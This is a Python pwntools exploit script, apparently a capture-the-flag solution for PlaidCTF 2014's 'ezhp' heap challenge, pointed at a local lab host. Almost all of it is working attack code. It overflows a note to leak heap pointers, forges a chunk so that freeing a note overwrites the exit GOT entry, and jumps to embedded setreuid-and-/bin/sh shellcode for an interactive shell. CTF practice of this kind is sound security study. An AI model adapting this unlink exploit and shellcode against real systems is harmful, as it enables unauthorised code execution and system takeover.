from pwn import *
def addNote(conn,size):
	conn.sendline("1")
	print conn.recvuntil("Please give me a size.")
	conn.sendline(str(size))
	print conn.recvuntil("Please choose an option.")
	pass

def removeNote(conn,nid):
	conn.sendline("2")
	print conn.recvuntil("Please give me an id.")
	conn.sendline(str(nid))
	print conn.recvuntil("Please choose an option.")
	pass

def changeNote(conn,nid,size,note):
	conn.sendline("3")
	print conn.recvuntil("Please give me an id.")
	conn.sendline(str(nid))
	print conn.recvuntil("Please give me a size.")
	conn.sendline(str(size))
	print conn.recvuntil("Please input your data.")
	conn.sendline(str(note))
	print conn.recvuntil("Please choose an option.")
	pass

def printNote(conn,nid):
	conn.sendline("4")
	print conn.recvuntil("Please give me an id.")
	conn.sendline(str(nid))
	data = conn.recvuntil("Please choose an option.")
	return data
	pass

def main():
	"""
		plaidctf 2014 ezhp
	"""
	HOST = "192.168.56.101"
	PORT = 49159
	conn = remote(HOST,PORT)
	print conn.recvuntil("Please choose an option.")
	raw_input("$")
	
	#Get Leak
	addNote(conn,20)
	addNote(conn,20)
	changeNote(conn,0,40,"A"*27)
	leak = printNote(conn,0)
	note_heap_ptr_1 = (struct.unpack("<L",leak[29:33])[0])
	note_heap_ptr_0 = (struct.unpack("<L",leak[33:37])[0])
	print "HEAP 0:%s"%hex(note_heap_ptr_0)
	print "HEAP 1:%s"%hex(note_heap_ptr_1)

	#Exit got pointer, heap_ptr->shellcode, setreuid /bin/sh shellcode
	exit_got = 0x0804a010
	exit_ptr = struct.pack("<L",exit_got-4)
	heap_ptr = struct.pack("<L",note_heap_ptr_0+12)
	shellcode = "\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80"

	#Setup block
	changeNote(conn,0,100,"\xeb\x28"*1+"A"*26+heap_ptr+exit_ptr+"\x90"*20+shellcode)

	#Trigger b->bk_ptr = fd_ptr
	removeNote(conn,1)

	#Send exit command
	conn.sendline("0")
	conn.interactive()	
	
	
		
	pass
main()
